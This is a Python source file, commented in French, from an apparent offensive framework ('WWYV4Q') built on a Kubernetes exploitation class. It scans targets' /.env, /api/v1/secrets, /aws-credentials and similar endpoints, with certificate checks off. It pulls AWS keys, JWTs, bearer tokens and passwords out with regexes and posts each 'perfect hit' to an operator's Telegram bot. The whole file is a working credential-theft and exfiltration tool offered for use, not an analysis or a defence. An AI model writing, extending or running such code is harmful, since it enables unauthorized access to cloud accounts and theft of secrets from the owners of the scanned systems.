#!/usr/bin/env python3
"""
WWYV4Q Perfect Hits System - Version Corrigée
Date: 2025-06-23 21:27:15 UTC
User: wKayaa
"""

import asyncio
import aiohttp
import json
import re
from datetime import datetime
from typing import Dict, List, Optional

# Import nécessaire pour l'héritage
from kubernetes_advanced import KubernetesAdvancedExploitation

class EnhancedPerfectHitDetector:
    """Détecteur amélioré pour tous types de hits avec Telegram"""
    
    def __init__(self):
        self.hit_counter = 2769385
        # Patterns étendus pour plus de détections
        self.extended_patterns = {
            'aws_access_key': r'AKIA[0-9A-Z]{16}',
            'aws_secret_key': r'[A-Za-z0-9/+=]{40}',
            'jwt_token': r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
            'api_key': r'[Aa][Pp][Ii]_?[Kk][Ee][Yy].*[\'\":\s=][A-Za-z0-9]{20,}',
            'bearer_token': r'[Bb]earer\s+[A-Za-z0-9_-]{20,}',
            'password_field': r'[Pp]assword.*[\'\":\s=][^\s\'\"]{8,}',
            'secret_field': r'[Ss]ecret.*[\'\":\s=][A-Za-z0-9_-]{10,}',
            'token_field': r'[Tt]oken.*[\'\":\s=][A-Za-z0-9_-]{10,}',
            'credential': r'[Cc]redential.*[\'\":\s=][A-Za-z0-9_-]{10,}',
            'key_field': r'[Kk]ey.*[\'\":\s=][A-Za-z0-9_-]{10,}'
        }
        
    def extract_any_credentials(self, content: str, url: str) -> Optional[Dict]:
        """Extraction de TOUS types de credentials pour Telegram"""
        
        found_credentials = []
        
        # Test de chaque pattern
        for pattern_name, pattern in self.extended_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                for match in matches[:3]:  # Limite à 3 par pattern
                    found_credentials.append({
                        'type': pattern_name.upper(),
                        'value': match[:50] + "..." if len(match) > 50 else match,
                        'confidence': 85.0,
                        'url': url
                    })
        
        # Si on trouve des credentials, retourner le premier
        if found_credentials:
            return found_credentials[0]
            
        # Recherche patterns génériques dans le contenu
        sensitive_keywords = ['password', 'secret', 'token', 'key', 'credential', 'api_key']
        for keyword in sensitive_keywords:
            if keyword.lower() in content.lower():
                return {
                    'type': 'GENERIC_SECRET',
                    'value': f"Found '{keyword}' in content",
                    'confidence': 70.0,
                    'url': url
                }
                
        return None

class TelegramEnhancedNotifier:
    """Système Telegram amélioré pour TOUS les hits"""
    
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.detector = EnhancedPerfectHitDetector()
        
    async def send_any_hit(self, credentials: Dict, endpoint: str = "", method: str = "enhanced_scan"):
        """Envoi de N'IMPORTE QUEL hit vers Telegram"""
        
        self.detector.hit_counter += 1
        timestamp = datetime.utcnow().isoformat()
        
        # Message formaté selon le type
        if credentials['type'] in ['AWS_ACCESS_KEY', 'AWS_SECRET_KEY']:
            message = f"""✨ PERFECT HIT #{self.detector.hit_counter} ✨

🔑 Service: AWS
🎯 Type: {credentials['type']}
🔐 Value: {credentials['value']}
🔥 REAL AWS CREDENTIALS

📊 Confidence: {credentials['confidence']:.1f}%
🌐 Source: {credentials['url']}
📄 Endpoint: {endpoint}
⚡️ Method: {method}
🕐 Time: {timestamp}

🚀 AWS CREDENTIALS EXTRACTED
💎 Quality: HIGH VALUE

Operator: wKayaa | Framework: WWYV4Q Enhanced v3.1
>>"""

        elif credentials['type'] in ['JWT_TOKEN', 'BEARER_TOKEN']:
            message = f"""🎯 TOKEN HIT #{self.detector.hit_counter}

🔑 Type: {credentials['type']}
🎯 Token: {credentials['value']}
🔥 ACTIVE TOKEN FOUND

📊 Confidence: {credentials['confidence']:.1f}%
🌐 Source: {credentials['url']}
📄 Endpoint: {endpoint}
🕐 Time: {timestamp}

💎 Operator: wKayaa | WWYV4Q Enhanced
>>"""

        else:
            message = f"""🔍 SECRET HIT #{self.detector.hit_counter}

🔑 Type: {credentials['type']}
🎯 Value: {credentials['value']}
📊 Confidence: {credentials['confidence']:.1f}%

🌐 Source: {credentials['url']}
📄 Endpoint: {endpoint}
🕐 Time: {timestamp}

Operator: wKayaa | WWYV4Q Enhanced v3.1
>>"""
        
        await self._send_telegram_message(message)
        print(f"📱 TELEGRAM HIT SENT: {credentials['type']}")
        
    async def _send_telegram_message(self, message: str):
        """Envoi réel vers Telegram"""
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=data) as response:
                    if response.status == 200:
                        print(f"📱 ✅ TELEGRAM SENT - Hit #{self.detector.hit_counter}")
                    else:
                        print(f"📱 ❌ Telegram error: {response.status}")
                        
        except Exception as e:
            print(f"📱 ❌ Telegram exception: {e}")

class WWYVQv5TelegramFixed(KubernetesAdvancedExploitation):
    """Version avec Telegram qui fonctionne pour TOUS les hits"""
    
    def __init__(self, config, telegram_token=None, telegram_chat_id=None):
        super().__init__(config)
        
        if telegram_token and telegram_chat_id:
            self.telegram = TelegramEnhancedNotifier(telegram_token, telegram_chat_id)
            print("📱 Telegram Enhanced Hits: ENABLED")
        else:
            self.telegram = None
            print("📱 Telegram Enhanced Hits: DISABLED")
            
    async def test_secrets(self, session: aiohttp.ClientSession, base_url: str):
        """Version qui envoie TOUS les hits vers Telegram"""
        endpoints = [
            "/api/v1/secrets", "/api/v1/configmaps", "/.env", "/admin/settings",
            "/config", "/credentials", "/aws-credentials", "/ses-config",
            "/metrics", "/healthz", "/version", "/admin", "/debug"
        ]
        
        for endpoint in endpoints:
            try:
                test_url = f"{base_url}{endpoint}"
                async with session.get(test_url, ssl=False, timeout=5) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Envoi vers Telegram pour TOUS les hits
                        if self.telegram:
                            credentials = self.telegram.detector.extract_any_credentials(content, test_url)
                            if credentials:
                                await self.telegram.send_any_hit(credentials, endpoint)
                                self.stats["secrets_extracted"] += 1
                                continue
                        
                        # Détection patterns sensibles basique (backup)
                        sensitive_patterns = [
                            'secret', 'password', 'token', 'key', 'aws',
                            'AKIA', 'credential', 'bearer', 'jwt', 'api_key'
                        ]
                        
                        for pattern in sensitive_patterns:
                            if pattern.lower() in content.lower():
                                self.logger.info(f"💾 SECRET POTENTIEL: {test_url} (Pattern: {pattern})")
                                self.stats["secrets_extracted"] += 1
                                break
                                
            except:
                continue

# Export
__all__ = ['EnhancedPerfectHitDetector', 'TelegramEnhancedNotifier', 'WWYVQv5TelegramFixed']